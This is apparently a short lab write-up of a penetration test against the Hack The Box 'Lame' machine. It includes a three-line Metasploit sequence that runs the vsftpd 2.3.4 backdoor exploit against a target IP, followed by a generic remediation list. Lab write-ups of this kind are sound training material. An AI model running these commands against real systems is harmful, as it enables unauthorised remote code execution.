# Full VAPT Engagement

## Objective

Simulate a complete penetration testing engagement from reconnaissance to reporting.

## Target Environment

Hack The Box: Lame

Target IP: 192.168.8.170

## Tools Used

Kali Linux

Metasploit

OpenVAS

Burp Suite

## Exploitation Timeline

| Timestamp            | Target IP       | Vulnerability | PTES Phase    |
|---------------------|-----------------|---------------|---------------|
| 2025-08-30 15:00:00 | 192.168.8.170   | VSFTPD RCE    | Exploitation  |

```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.8.170
run
```
## Remediation

Patch vulnerable services

Enforce least privilege

Validate API input

Enable logging and monitoring

Re-scan environment using OpenVAS

## Summary
The assessment identified critical vulnerabilities that allowed full system compromise through outdated services and weak access controls. Immediate patching, improved monitoring, and secure configuration practices are recommended to reduce risk exposure. Regular security testing and employee awareness are essential to prevent similar attacks in production environments.
